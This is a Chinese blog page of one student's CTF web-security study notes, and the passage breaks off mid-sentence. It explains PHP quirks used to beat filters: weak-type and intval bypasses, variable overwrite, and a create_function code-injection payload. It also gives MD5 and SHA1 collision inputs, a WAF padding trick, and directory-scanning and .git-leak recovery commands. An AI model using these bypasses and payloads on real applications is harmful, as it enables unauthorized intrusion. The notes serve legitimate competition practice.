
<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="UTF-8" />
        <title>Web笔记 | 遗世独立の幻想乡</title>
        <meta name="author" content="CloudFlowing" />
        <meta name="description" content="" />
        <meta name="keywords" content="" />
        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
        <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
        <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<script> const mixins = {}; </script>

<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>


<script src="https://cdn.staticfile.org/highlight.js/11.7.0/highlight.min.js"></script>
<link
    rel="stylesheet"
    href="https://cdn.staticfile.org/highlight.js/11.7.0/styles/github.min.css"
/>
<script src="/blog/js/lib/highlight.js"></script>



<script src="/blog/js/lib/preview.js"></script>









<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />

        <!-- 页面点击小红心 -->
        <script type = "text/javascript" src = "/blog/js/love-click.js"></script>
        <!-- 浏览器搞笑标题 -->
        <script type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
    <meta name="generator" content="Hexo 6.3.0"></head>
    <body>
        <div id="layout">
            <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
            </transition>
            <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>遗世独立の幻想乡</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;遗世独立の幻想乡</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>Web笔记</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/2/28
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/%E5%AD%A6%E4%B9%A0/" style="color: #00a596">学习</a>
            </span>
            
        </span>
        
    </div>
    
    <div class="content" v-pre>
        <h1 id="官方WP"><a href="#官方WP" class="headerlink" title="官方WP"></a>官方WP</h1><p><a target="_blank" rel="noopener" href="https://dqgom7v7dl.feishu.cn/docx/doxcnfAleQyWvxtaviJQUyfedGd">HNCTF WEB</a></p>
<p>[ISCTF](D:\文档\CTF\Write Up\ISCTF2022-main\ISCTF2022-WriteUp.md)</p>
<p>[Skynico](D:&#x2F;文档&#x2F;CTF&#x2F;Write Up&#x2F;SkyNICO Writeup.pdf)</p>
<p>菜狗杯</p>
<p>RCTF</p>
<p>Hgame</p>
<p><a target="_blank" rel="noopener" href="https://k4d0n.github.io/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023writeup/">西湖论剑</a></p>
<p>南森</p>
<span id="more"></span>

<hr>
<h1 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/weibanggang/p/9454581.html">八种请求</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lamaper/p/16625305.html">session</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq28129019/article/details/115913596?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166974060716782425643392%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166974060716782425643392&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-115913596-null-null.142%5Ev67%5Epc_rank_34_queryrelevant25,201%5Ev3%5Econtrol,213%5Ev2%5Et3_esquery_v2&utm_term=%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AF%AD%E6%B3%95&spm=1018.2226.3001.4187">正则表达式</a></p>
<p><a href="D:\文档\CTF\协会资料\burpsuite实战指南.pdf">BurpSuite</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ityard/article/details/102807071">python</a></p>
<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a><a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-tutorial.html">PHP</a></h3><p>PHP将查询字符串（在URL或正文中）转换为内部关联数组$_GET或关联数组$_POST。例如：**&#x2F;?foo&#x3D;bar变成Array([foo] &#x3D;&gt; “bar”).**  </p>
<p>值得注意的是，查询字符串在解析的过程中<strong>会将某些字符删除或用下划线代替</strong></p>
<blockquote>
<p><strong>php需要将所有参数转换为有效的变量名，因此在解析查询字符串的时候，它会做两件事：</strong></p>
<p><strong>①删除前后的空白符（空格符，制表符，换行符等统称空白符）</strong></p>
<p><strong>②将某些字符转换为下划线（包括空格）</strong></p>
</blockquote>
<h4 id="弱类型下数字相等绕过方式："><a href="#弱类型下数字相等绕过方式：" class="headerlink" title="弱类型下数字相等绕过方式："></a>弱类型下数字相等绕过方式：</h4><p>  传入字符串</p>
<p>  使用科学计数法</p>
<blockquote>
<p> 使用例</p>
</blockquote>
<pre><code class="php">if($year==2022 &amp;&amp; $year+1!==2023)&#123;
  echo $flag; 
</code></pre>
<blockquote>
<p>此时传入202.2e1即可绕过</p>
</blockquote>
<hr>
<h4 id="phpinfo-函数"><a href="#phpinfo-函数" class="headerlink" title="phpinfo()函数"></a>phpinfo()函数</h4><blockquote>
<p>会输出关于 PHP 配置的信息</p>
<p>返回类型：phpinfo()函数返回一个布尔值</p>
</blockquote>
<pre><code class="php">phpinfo ([ int $what = INFO_ALL ] )
</code></pre>
<hr>
<h4 id="system-函数"><a href="#system-函数" class="headerlink" title="system()函数"></a>system()函数</h4><blockquote>
<p>系统权限允许的情况执行系统命令，并输出结果</p>
</blockquote>
<hr>
<h4 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h4><ul>
<li>post传入的参数并不能实现变量交换</li>
</ul>
<blockquote>
<p>用我们自定义的参数值替换程序原有的变量值</p>
</blockquote>
<pre><code class="php">$$ 
extract()函数
parse_str()函数
import_request_variables()函数
</code></pre>
<h5 id=""><a href="#" class="headerlink" title="$$"></a>$$</h5><blockquote>
<p>将之前定义的变量的值重新定义新的变量</p>
</blockquote>
<pre><code class="php">$a=b
$b=c

$$a = $($a) = $b = c
</code></pre>
<h5 id="extract-函数"><a href="#extract-函数" class="headerlink" title="extract()函数"></a>extract()函数</h5><blockquote>
<p>将数组中的变量导入到当前的符号表</p>
</blockquote>
<pre><code class="php">extract(array,extract_rules,prefix) 
    
//array 必需的，规定要使用的数组
//extract_rules 可有可无，如果为空，则默认为EXTR_OVERWRITE
//prefix可选。如果 extract_rules 参数的值是 EXTR_PREFIX_SAME、EXTR_PREFIX_ALL、 EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS，则 prefix 是必需的。该参数规定了前缀。前缀和数组键名之间会自动加上一个下划线。
</code></pre>
<h5 id="parse-str-函数"><a href="#parse-str-函数" class="headerlink" title="parse_str()函数"></a>parse_str()函数</h5><blockquote>
<p>把传入的字符串放入变量数组中去</p>
</blockquote>
<pre><code class="php">parse_str(string,array)
    
//string 	必需。规定要解析的字符串。
//array 	可选。规定存储变量的数组名称。该参数指示变量存储到数组中。
//          如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。
</code></pre>
<hr>
<h4 id="非法传参"><a href="#非法传参" class="headerlink" title="非法传参"></a>非法传参</h4><blockquote>
<p>当变量名中出现点和空格时，变量名中的点和空格被转换成下划线</p>
</blockquote>
<ul>
<li><p>版本：php &lt; 8</p>
</li>
<li><p>如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，但是会出现转换错误导致接下来如果该参数名中还有<code>非法字符</code>并不会继续转换成下划线<code>_</code>，也就是说如果中括号<code>[</code>出现在前面，那么中括号<code>[</code>还是会被转换成下划线<code>_</code>，但是因为出错导致接下来的非法字符并不会被转换成下划线<code>_</code></p>
</li>
</ul>
<hr>
<h4 id="PHP短标签"><a href="#PHP短标签" class="headerlink" title="PHP短标签"></a>PHP短标签</h4><pre><code class="php">&lt;? echo &#39;123&#39;;?&gt;  #前提是开启配置参数short_open_tags=on
&lt;?=(表达式)?&gt;  等价于 &lt;?php echo (表达式)?&gt;  #不需要开启参数设置
&lt;% echo &#39;123&#39;;%&gt;   #开启配置参数asp_tags=on，并且只能在7.0以下版本使用
&lt;script language=&quot;php&quot;&gt;echo &#39;123&#39;; &lt;/script&gt; #不需要修改参数开关，但是只能在7.0以下可用。
</code></pre>
<ul>
<li>可绕过过滤&lt;?或php</li>
</ul>
<hr>
<h4 id="substr函数"><a href="#substr函数" class="headerlink" title="substr函数"></a>substr函数</h4><blockquote>
<p>返回字符串的一部分</p>
</blockquote>
<p>  如果 参数<code>start </code>是负数且 <code>length</code> 小于或等于 <code>start</code>，则 <code>length</code> 为 0。</p>
<pre><code class="php">substr(string,start,length)
</code></pre>
<ul>
<li><p><code>start</code>:</p>
<p>正数 - 在字符串的指定位置开始</p>
<p>负数 - 在从字符串结尾的指定位置开始</p>
<p>0 - 在字符串中的第一个字符处开始</p>
</li>
<li><p><code>length</code>:</p>
<p>正数 - 从<code>start</code>参数所在的位置向后返回字符个数</p>
<p>负数 - 从字符串末端指定位置向前返回字符个数</p>
</li>
</ul>
<hr>
<h4 id="intval函数"><a href="#intval函数" class="headerlink" title="intval函数"></a>intval函数</h4><blockquote>
<p>将给定变量转换成整型变量</p>
</blockquote>
<pre><code class="php">int intval ( var , base )
////var指要转换成 integer 的数量值,base指转化所使用的进制 
</code></pre>
<ul>
<li><p><code>var</code> 可以是任何标量类型，变量不能是array和object格式</p>
</li>
<li><p>除非<code>var</code>参数是字符串，否则 <strong>intval()</strong> 的 <code>base </code>参数不会有效果</p>
</li>
<li><p>如果 <code>base </code>是 0，通过检测 <code>var </code>的格式来决定使用的进制： </p>
<ul>
<li>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；</li>
<li>否则，如果字符串以 “0” 开始，使用 8 进制(octal)；</li>
<li>否则，将使用 10 进制 (decimal)。</li>
</ul>
</li>
</ul>
<blockquote>
<p>利用方式</p>
</blockquote>
<ul>
<li><p>过滤某个数字时，我们可以利用它的进制转换来绕过</p>
<pre><code class="php">&lt;?php
echo intval(042);                     // 34
echo intval(0x1A);                    // 2
?&gt; 
</code></pre>
</li>
<li><p>数组绕过</p>
<blockquote>
<p>返回值<br>成功时返回 var 的 integer 值，失败时返回 0。空的 array 返回 0，非空的 array 返回 1。 </p>
</blockquote>
<pre><code class="php">if(a!=b)&#123;
    if(a==b)&#123;
        
    &#125;
&#125;
    //输入a[]=1和b[]=2绕过(此时两个不同但是都返回1)
</code></pre>
</li>
<li><p>小数点绕过</p>
<blockquote>
<p>小数点后的数字会直接舍去</p>
</blockquote>
<pre><code class="php">echo intval(42);                      // 42
echo intval(4.2);                     // 4
</code></pre>
</li>
<li><p>单引号字母绕过</p>
<blockquote>
<p>单引号传值的时候，它只识别字母前面的一部分</p>
<p>进行get传参时,默认加单引号</p>
</blockquote>
<pre><code class="php">echo intval(1e10);                    // 1410065408
echo intval(&#39;1e10&#39;);                  // 1
</code></pre>
<ul>
<li>仅在<strong>php5</strong>下可实现1e10&#x3D;1；<strong>php7</strong>下会转换成10的10次方</li>
<li>计算时1e10会自动转换为10的10次方</li>
</ul>
</li>
</ul>
<hr>
<h4 id="mt-srand函数"><a href="#mt-srand函数" class="headerlink" title="mt_srand函数"></a>mt_srand函数</h4><blockquote>
<p>播种 Mersenne Twister 随机数生成器</p>
</blockquote>
<pre><code class="php"> mt_srand(seed);
</code></pre>
<ul>
<li><code>seed</code>：可选，规定播种值，设置之后即为伪随机</li>
</ul>
<h5 id="伪随机数漏洞"><a href="#伪随机数漏洞" class="headerlink" title="伪随机数漏洞"></a>伪随机数漏洞</h5><p>存在可预测性：</p>
<p>知道种子后，可以确定输出伪随机数的序列<br>知道随机数序列，可以确定你的种子</p>
<hr>
<h4 id="hexdec函数"><a href="#hexdec函数" class="headerlink" title="hexdec函数"></a>hexdec函数</h4><blockquote>
<p>返回与 <em>hex_string</em> 参数所表示的十六进制数等值的的十进制数</p>
</blockquote>
<pre><code class="php">hexdec(hex_string)
</code></pre>
<ul>
<li><code>hexdec()</code> 会将遇到的所有非十六进制字符替换成 0，这样，所有左边的零都被忽略，但右边的零会计入值中</li>
</ul>
<hr>
<h4 id="parse-url函数"><a href="#parse-url函数" class="headerlink" title="parse_url函数"></a>parse_url函数</h4><blockquote>
<p>解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分</p>
</blockquote>
<pre><code class="php">parse_url(参数1,参数2)
</code></pre>
<ul>
<li><p>参数1：必填 ，是一个完整的URL，如果不完整，函数会模糊补全。</p>
<p>参数2：非必填，是一个大写参数变量，直接获取结果集的某一部分。</p>
</li>
</ul>
<pre><code class="php">&lt;?php
$url = &quot;https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu#id&quot;;
$arr = parse_url($url);
echo &quot;&lt;pre&gt;&quot;;
print_r($arr);
echo &quot;&lt;/pre&gt;&quot;;
?&gt;
    
//&lt;pre&gt;Array
//(
//    [scheme] =&gt; https
//    [host] =&gt; www.baidu.com
//    [path] =&gt; /s
//    [query] =&gt; ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu
//    [fragment] =&gt; id
//)
//&lt;/pre&gt;
</code></pre>
<hr>
<h4 id="SERVER-‘REQUEST-URI’"><a href="#SERVER-‘REQUEST-URI’" class="headerlink" title="$_SERVER[‘REQUEST_URI’]"></a>$_SERVER[‘REQUEST_URI’]</h4><blockquote>
<p>访问此页面所需的 URI </p>
</blockquote>
<hr>
<h4 id="create-function函数"><a href="#create-function函数" class="headerlink" title="create_function函数"></a><a id="create_function">create_function函数</a></h4><blockquote>
<p>该函数用来创建匿名函数,并为其返回唯一名称</p>
<p>PHP4,PHP5,PHP7</p>
</blockquote>
<pre><code class="php">create_function(string $args,string $code)
//string $args 声明的函数变量部分
//string $code 执行的方法代码部分
</code></pre>
<ul>
<li><p>使用例</p>
<pre><code class="php">$id=$_GET[&#39;id&#39;];

$code = &#39;echo $name. &#39;.&#39;的编号是&#39;.$id.&#39;; &#39;;

$b = create_function(&#39;$name&#39;,$code);
//实现
function niming($name)&#123;
echo $name.&quot;编号&quot;.$id;
&#125;
$b(&#39;sd&#39;);
</code></pre>
<p>payload：</p>
<pre><code class="php">?id=2;&#125;phpinfo();/* 
</code></pre>
<pre><code class="php">此时代码为
function niming($name)&#123;
echo $name.编号2;
     &#125;phpinfo();/*
&#125;
</code></pre>
</li>
</ul>
<hr>
<h4 id="foreach函数"><a href="#foreach函数" class="headerlink" title="foreach函数"></a>foreach函数</h4><blockquote>
<p>遍历数组</p>
</blockquote>
<pre><code class="php">foreach (array_expression as $value) statement
    
foreach (array_expression as $key =&gt; $value) statement
</code></pre>
<ul>
<li>当 foreach 开始执行时，数组内部的指针会自动指向第一个单元</li>
</ul>
<hr>
<h4 id="mb-substr-函数"><a href="#mb-substr-函数" class="headerlink" title="mb_substr()函数"></a>mb_substr()函数</h4><blockquote>
<p>返回字符串的一部分,如果失败则返回 FALSE，或者返回一个空字符串</p>
<p>PHP：4+</p>
</blockquote>
<pre><code class="php">mb_substr ( string $str , int $start [, int $length = NULL [, string $encoding = mb_internal_encoding() ]] ) : string 
</code></pre>
<ul>
<li><code>encoding</code>:可选。字符编码。如果省略，则使用内部字符编码。</li>
</ul>
<hr>
<h4 id="mb-strpos-函数"><a href="#mb-strpos-函数" class="headerlink" title="mb_strpos()函数"></a>mb_strpos()函数</h4><blockquote>
<p>查找字符串在另一个字符串中首次出现的位置</p>
<p>PHP 4 &gt;&#x3D; 4.0.6, PHP 5, PHP 7</p>
</blockquote>
<pre><code class="php">mb_strpos (haystack ,needle )
//haystack：要被检查的字符串
//needle：要搜索的字符串
</code></pre>
<hr>
<h4 id="in-array-函数"><a href="#in-array-函数" class="headerlink" title="in_array()函数"></a>in_array()函数</h4><blockquote>
<p>判断一个值是否在数组中</p>
</blockquote>
<pre><code class="php">in_array(value,array,type)
//value ：要搜索的值
//array ：被搜索的数组
//type ： 类型，true全等 ，false非全等(默认)
</code></pre>
<hr>
<h4 id="strstr-函数"><a href="#strstr-函数" class="headerlink" title="strstr()函数"></a>strstr()函数</h4><blockquote>
<p>判断字符串str2是否是str1的子串。如果是，则该函数返回 str1字符串从 str2第一次出现的位置开始到 str1结尾的字符串；否则，返回NULL。(搜索字符串在另一个字符串出现的位置，)</p>
<p>PHP3，PHP4，PHP5</p>
</blockquote>
<pre><code class="php">strstr(str1,str2)
</code></pre>
<ul>
<li>该函数区分大小写，不区分的可用<code>stristr()</code></li>
</ul>
<hr>
<h4 id="str-ireplace-函数"><a href="#str-ireplace-函数" class="headerlink" title="str_ireplace()函数"></a>str_ireplace()函数</h4><blockquote>
<p>替换字符串中的一些字符（不区分大小写）</p>
<p>PHP5+</p>
</blockquote>
<pre><code class="php">str_ireplace(find,replace,string,count) 
</code></pre>
<ul>
<li>可使用<code>str_replace()</code>函数执行区分大小写</li>
</ul>
<hr>
<h4 id="foreach-函数"><a href="#foreach-函数" class="headerlink" title="foreach()函数"></a>foreach()函数</h4><blockquote>
<p>一种遍历数组简便方法</p>
<p>仅能用于数组，当试图将其用于其它数据类型或者一个未初始化的变量时会产生错误</p>
</blockquote>
<pre><code class="php">foreach (array_expression as $value) statement
    //遍历给定的 array_expression 数组。每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步
</code></pre>
<hr>
<h4 id="glob-函数"><a href="#glob-函数" class="headerlink" title="glob()函数"></a>glob()函数</h4><blockquote>
<p>返回匹配指定模式的文件名或目录</p>
<p>返回一个包含有匹配文件 &#x2F; 目录的数组。如果出错返回 false</p>
</blockquote>
<pre><code class="php">glob(pattern,flags)
    检索模式
</code></pre>
<hr>
<h4 id="print与print-r"><a href="#print与print-r" class="headerlink" title="print与print_r"></a>print与print_r</h4><p><code>print</code>:只允许输出一个字符串</p>
<p><code>print_r</code>:打印变量</p>
<hr>
<h4 id="类"><a href="#类" class="headerlink" title="类"></a>类</h4><pre><code class="php">类名::方法名
//调用此类的方法
</code></pre>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-command-manual.html">Linux命令</a></p>
<h3 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a><a target="_blank" rel="noopener" href="https://www.runoob.com/js/js-tutorial.html">javascript</a></h3><h4 id="btoa-amp-atob"><a href="#btoa-amp-atob" class="headerlink" title="btoa()&amp;atob()"></a>btoa()&amp;atob()</h4><blockquote>
<p>前者创建一个 base-64 编码的字符串，后者是解码</p>
</blockquote>
<pre><code class="javascript">var enc = window.btoa(str);
</code></pre>
<h3 id="编码方式"><a href="#编码方式" class="headerlink" title="编码方式"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/RuoLi_s/article/details/109767829?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167448358816800215059313%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167448358816800215059313&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109767829-null-null.142%5Ev71%5Einsert_chatgpt,201%5Ev4%5Eadd_ask&utm_term=ctf%E5%B8%B8%E8%A7%81%E7%BC%96%E7%A0%81&spm=1018.2226.3001.4187">编码方式</a></h3><h4 id="敲击码-Tap-code"><a href="#敲击码-Tap-code" class="headerlink" title="敲击码(Tap code)"></a><a target="_blank" rel="noopener" href="http://www.hiencode.com/tapcode.html">敲击码(Tap code)</a></h4><h3 id="md5等效值绕过"><a href="#md5等效值绕过" class="headerlink" title="md5等效值绕过"></a>md5等效值绕过</h3><ul>
<li><p>弱类型绕过</p>
<ul>
<li><p>以0e开头的数字后面会被忽略（科学计数法）、</p>
<pre><code>QNKCDZO

240610708

s878926199a

s155964671a

s1091221200a
</code></pre>
</li>
<li><p>数组绕过</p>
<p>原理是<strong>md5等函数不能处理数组，导致函数返回Null</strong>。而Null是等于Null的，导致了绕过。</p>
</li>
</ul>
</li>
<li><p>强类型绕过</p>
<p>用MD值完全相同的字符来进行绕过</p>
<pre><code>psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2

psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2
</code></pre>
</li>
<li><p>自身和md5后都是0e开头</p>
<pre><code>0e215962017
</code></pre>
</li>
</ul>
<h3 id="SHA1碰撞"><a href="#SHA1碰撞" class="headerlink" title="SHA1碰撞"></a>SHA1碰撞</h3><pre><code>array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
</code></pre>
<hr>
<h3 id="绕waf"><a href="#绕waf" class="headerlink" title="绕waf"></a>绕waf</h3><h4 id="限制长度"><a href="#限制长度" class="headerlink" title="限制长度"></a>限制长度</h4><p>添加脏数据：</p>
<pre><code>1=1&amp;1=1&amp;1=1&amp;
</code></pre>
<hr>
<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><h4 id="PDO"><a href="#PDO" class="headerlink" title="PDO"></a><a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-pdo.html">PDO</a></h4><blockquote>
<p>提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据</p>
<p>PHP&gt;&#x3D;5.1</p>
</blockquote>
<pre><code class="php">&lt;?php
$dbms=&#39;mysql&#39;;     //数据库类型
$host=&#39;localhost&#39;; //数据库主机名
$dbName=&#39;test&#39;;    //使用的数据库
$user=&#39;root&#39;;      //数据库连接用户名
$pass=&#39;&#39;;          //对应的密码
$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;


try &#123;
    $dbh = new PDO($dsn, $user, $pass); //初始化一个PDO对象
    echo &quot;连接成功&lt;br/&gt;&quot;;
    /*你还可以进行一次搜索操作
    foreach ($dbh-&gt;query(&#39;SELECT * from FOO&#39;) as $row) &#123;
        print_r($row); //你可以用 echo($GLOBAL); 来看到这些值
    &#125;
    */
    $dbh = null;
&#125; catch (PDOException $e) &#123;
    die (&quot;Error!: &quot; . $e-&gt;getMessage() . &quot;&lt;br/&gt;&quot;);
&#125;
//默认这个不是长连接，如果需要数据库长连接，需要最后加一个参数：array(PDO::ATTR_PERSISTENT =&gt; true) 变成这样：
$db = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT =&gt; true));

?&gt;
</code></pre>
<h4 id="load-file-函数"><a href="#load-file-函数" class="headerlink" title="load_file()函数"></a>load_file()函数</h4><pre><code class="mysql">load_file(file_name)
</code></pre>
<h1 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h1><h2 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h2><h3 id="Kali扫描"><a href="#Kali扫描" class="headerlink" title="Kali扫描"></a>Kali扫描</h3><pre><code class="markdown">dirsearch -u url
</code></pre>
<h3 id="GitHack"><a href="#GitHack" class="headerlink" title="GitHack"></a>GitHack</h3><p>GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，重建还原工程源代码。<br>渗透测试人员、攻击者，可以进一步审计代码，挖掘：文件上传，SQL注射等web安全漏洞。</p>
<p>在安装文件夹下打开终端</p>
<pre><code>python GitHack.py url/.git
</code></pre>
<hr>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="http注释"><a href="#http注释" class="headerlink" title="http注释"></a>http注释</h3><p>f12查看&lt;!–</p>
